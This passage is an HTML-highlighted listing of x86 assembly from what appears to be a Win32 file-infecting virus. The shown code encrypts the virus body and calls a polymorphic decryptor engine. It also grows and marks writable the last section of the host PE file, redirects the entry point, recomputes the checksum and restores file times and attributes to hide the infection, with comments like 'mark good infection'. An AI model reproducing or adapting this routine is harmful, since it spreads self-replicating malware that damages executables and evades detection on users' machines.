       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'THUN'</span><span class="sc4">+</span><span class="sc12">'DERP'</span><span class="sc4">+</span><span class="sc12">'ICK'</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'LORD'</span><span class="sc4">+</span><span class="sc12">'JULU'</span><span class="sc4">+</span><span class="sc12">'S'</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'KICK'</span><span class="sc4">+</span><span class="sc12">'ASS!'</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">encrypt_routine</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">encrypt_iteration</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">incrsize</span><span class="sc0">      </span><span class="sc1">;нincrease Virtual Size</span><span class="sc0">
                           </span><span class="sc1">;нof last section</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;нincrease Size of raw</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">incrsize</span><span class="sc0">               </span><span class="sc1">;нdata and align it</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filealign</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">     </span><span class="sc1">;нmake it R/W</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нnow calculate the new</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;нfile size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filealign</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;нzero the rest</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                       </span><span class="sc1">;нprepare to call the</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesection</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нpoly engine</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">randomincr</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly_code_start</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesection</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">randomincr</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly_code_start</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly_code_start</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly_decryptor</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">end</span><span class="sc4">-</span><span class="sc5">poly_code_start</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">create_poly</span><span class="sc0">                </span><span class="sc1">;нmake the poly decr.</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofimage</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нnow calculate the new</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">incrsize</span><span class="sc0">               </span><span class="sc1">;нsize of image</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sectionalign</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;нstore it!</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">neweip</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;нstore the new EIP</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_CheckSum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;нis the checksum null?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_checksum</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@21</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Imagehlp.DLL'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@21</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_checksum</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@20</span><span class="sc0">                    </span><span class="sc1">;нhere we try to retrieve</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CheckSumMappedFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;нthe checksum API</span><span class="sc0">
</span><span class="sc5">@20</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;нif we fail it means we</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetProcAddress</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нwe don't have this api</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_checksum</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@22</span><span class="sc0">                    </span><span class="sc1">;нcompute the new</span><span class="sc0">
</span><span class="sc5">chksum</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;нchecksum...</span><span class="sc0">
</span><span class="sc5">@22</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@23</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@23</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">chksum</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_CheckSum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;нand fill it up...</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">no_checksum</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesection</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нmake code section R/W</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">     </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;нmark good infection</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">unmap_view</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;нunmap the file</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">close_map</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maphandle</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;нclose the map</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_BEGIN</span><span class="sc0">                 </span><span class="sc1">;нset the file pointer</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;нto the filesize</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFilePointer</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;нset the end of file</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetEndOfFile</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filetime</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нrestore the file time</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileTime</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;нclose the file</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">quit_infection</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;нrestore the attributes</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fileattributes</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileAttributes</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">do_clc</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">;нbad infection</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">do_clc</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                     </span><span class="sc1">;нgood infection</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;нreturn</span><span class="sc0">
</span><span class="sc5">filetime</span><span class="sc0">       </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">filehandle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">memsize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">maphandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">mapaddress</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">fileattributes</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">neweip</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
